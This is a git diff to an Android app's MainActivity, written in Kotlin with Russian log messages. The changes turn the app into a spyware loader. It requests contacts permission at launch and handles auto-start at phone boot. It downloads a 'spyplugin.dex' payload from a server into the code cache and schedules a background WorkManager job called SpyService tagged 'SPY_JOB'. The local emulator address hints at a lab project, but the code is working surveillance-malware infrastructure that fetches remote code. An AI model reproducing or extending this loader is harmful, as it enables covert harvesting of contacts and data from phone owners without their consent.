@@ -3,19 +3,27 @@ package com.example.background
 import android.content.Context
 import android.content.pm.PackageManager
 import android.os.Bundle
+import android.os.SystemClock.sleep
 import android.util.Log
 import android.widget.Button
 import android.widget.TextView
+import android.widget.Toast
 import androidx.activity.ComponentActivity
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
+import androidx.lifecycle.lifecycleScope
 import androidx.work.Constraints
 import androidx.work.NetworkType
 import androidx.work.OneTimeWorkRequestBuilder
 import androidx.work.WorkManager
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
 import java.io.File
 import java.io.FileOutputStream
+import java.net.HttpURLConnection
 import java.net.URL
 import java.util.concurrent.TimeUnit
 
@@ -23,11 +31,20 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.main_activity)
+        Toast.makeText(this, "Приложение запущено автоматически", Toast.LENGTH_LONG).show()
+
+        if (intent.getBooleanExtra("auto_start", false)) {
+            val startTime = intent.getLongExtra("start_time", 0)
+            Log.d("MainActivity", "Приложение запущено автоматически при включении телефона")
+            Toast.makeText(this, "Приложение запущено автоматически", Toast.LENGTH_LONG).show()
+        }
 
         val textView = findViewById<TextView>(R.id.textViewStatus)
         val start_button = findViewById<Button>(R.id.buttonStart)
         val stop_button = findViewById<Button>(R.id.buttonStop)
 
+        Log.d("Main", "Активность запущена")
+        requestContactPermission()
         start_button.setOnClickListener {
             requestContactPermission()
             textView.text = getString(R.string.text_start)
@@ -72,33 +89,70 @@ class MainActivity : ComponentActivity() {
     private fun startTask() {
         val constraints = Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()
 
-        downloadDex(this, "http://10.0.2.2:8000/spyplugin.dex") { file ->
-            runOnUiThread {
-                val quickWorkRequest = OneTimeWorkRequestBuilder<SpyService>()
-                    .addTag("SPY_JOB")
-                    .setConstraints(constraints)
-                    .setInitialDelay(1, TimeUnit.MINUTES)
-                    .build()
+        lifecycleScope.launch {
+            val file = downloadDex(this@MainActivity, "http://10.0.2.2:8000/spyplugin.dex")
+            val quickWorkRequest = OneTimeWorkRequestBuilder<SpyService>()
+                .addTag("SPY_JOB")
+                .setConstraints(constraints)
+                .setInitialDelay(1, TimeUnit.MINUTES)
+                .build()
 
-                WorkManager.getInstance().enqueue(quickWorkRequest)
-            }
+            WorkManager.getInstance(this@MainActivity).enqueue(quickWorkRequest)
         }
     }
 
-    private fun stopTask() = WorkManager.getInstance().cancelAllWorkByTag("SPY_JOB")
+    private fun stopTask() = WorkManager.getInstance(this@MainActivity).cancelAllWorkByTag("SPY_JOB")
 
-    fun downloadDex(context: Context, url: String, onComplete: (File) -> Unit) {
-        Thread {
-            val file = File(context.filesDir, "spyplugin.dex")
-            URL(url).openStream().use { input ->
-                FileOutputStream(file).use { output ->
-                    input.copyTo(output)
+    suspend fun downloadDex(context: Context, urlString: String): File =
+        withContext(Dispatchers.IO) {
+
+            val tempFile = File(context.codeCacheDir, "spyplugin.tmp")
+            val finalFile = File(context.codeCacheDir, "spyplugin.dex")
+
+            if (tempFile.exists()) tempFile.delete()
+
+            val url = URL(urlString)
+            val connection = url.openConnection() as HttpURLConnection
+
+            connection.connectTimeout = 15000
+            connection.readTimeout = 15000
+            connection.requestMethod = "GET"
+            connection.doInput = true
+
+            connection.setRequestProperty("Connection", "close")
+            connection.setRequestProperty("Accept-Encoding", "identity")
+
+            connection.connect()
+
+            if (connection.responseCode != HttpURLConnection.HTTP_OK) {
+                throw Exception("HTTP ${connection.responseCode}")
+            }
+
+            val buffer = ByteArray(8192)
+
+            connection.inputStream.use { input ->
+                FileOutputStream(tempFile).use { output ->
+                    while (true) {
+                        val bytes = input.read(buffer)
+                        if (bytes <= 0) break
+                        output.write(buffer, 0, bytes)
+                    }
+                    output.flush()
                 }
             }
-            file.setReadable(true)
-            file.setWritable(false)
-            file.setExecutable(false)
-            onComplete(file)
-        }.start()
-    }
+
+            connection.disconnect()
+
+            if (tempFile.length() < 1000) {
+                tempFile.delete()
+                throw Exception("File too small")
+            }
+
+            finalFile.delete()
+            tempFile.renameTo(finalFile)
+
+            finalFile.setWritable(false)
+
+            finalFile
+        }
 }
